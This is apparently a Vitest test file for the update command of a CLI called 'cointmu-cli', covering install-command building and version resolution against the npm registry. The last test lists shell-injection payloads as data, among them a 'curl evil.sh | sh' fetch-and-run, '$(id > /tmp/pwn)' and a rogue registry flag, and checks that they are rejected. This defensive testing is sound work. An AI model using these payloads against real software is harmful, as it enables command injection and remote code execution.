import { afterEach, describe, expect, it, vi } from "vitest";
import { buildInstallCommand, resolveTargetVersion } from "../../src/commands/update";

describe("buildInstallCommand", () => {
  it("targets the pinned version on the npm registry, not git", () => {
    expect(buildInstallCommand("1.3.1")).toBe(
      "npm install -g cointmu-cli@1.3.1",
    );
  });
});

describe("resolveTargetVersion", () => {
  afterEach(() => {
    vi.restoreAllMocks();
    vi.resetModules();
  });

  it("returns the version reported by the registry for a valid request", async () => {
    vi.doMock("child_process", () => ({
      execFileSync: () => Buffer.from("1.3.1\n"),
    }));
    await expect(resolveTargetVersion("1.3.1")).resolves.toBe("1.3.1");
  });

  it("falls back to the latest published version when none is requested", async () => {
    vi.doMock("child_process", () => ({
      execFileSync: () => Buffer.from("1.3.2\n"),
    }));
    await expect(resolveTargetVersion()).resolves.toBe("1.3.2");
  });

  it("parses the quoted version from a multi-line range response", async () => {
    vi.doMock("child_process", () => ({
      execFileSync: () =>
        Buffer.from("cointmu-cli@1.3.1 '1.3.1'\ncointmu-cli@1.3.2 '1.3.2'\n"),
    }));
    await expect(resolveTargetVersion(">=1.3.0")).resolves.toBe("1.3.2");
  });

  it("throws a clear error when the requested version is not published", async () => {
    vi.doMock("child_process", () => ({
      execFileSync: () => {
        throw new Error("npm error code E404");
      },
    }));
    await expect(resolveTargetVersion("99.0.0")).rejects.toThrow(
      /not available on the npm registry/,
    );
  });

  it("rejects --to values with shell metacharacters before running any command", async () => {
    const execFileSync = vi.fn(() => Buffer.from("1.3.2\n"));
    vi.doMock("child_process", () => ({ execFileSync }));

    const payloads = [
      "1.0.0; curl evil.sh | sh #",
      "$(id > /tmp/pwn)",
      "`id`",
      "1.0.0 && id",
      "1.0.0 | id",
      "1.0.0 & id",
      "latest\nid",
      "--registry=http://evil.example",
    ];

    for (const payload of payloads) {
      await expect(resolveTargetVersion(payload)).rejects.toThrow(
        /Invalid --to value/,
      );
    }

    expect(execFileSync).not.toHaveBeenCalled();
  });
});
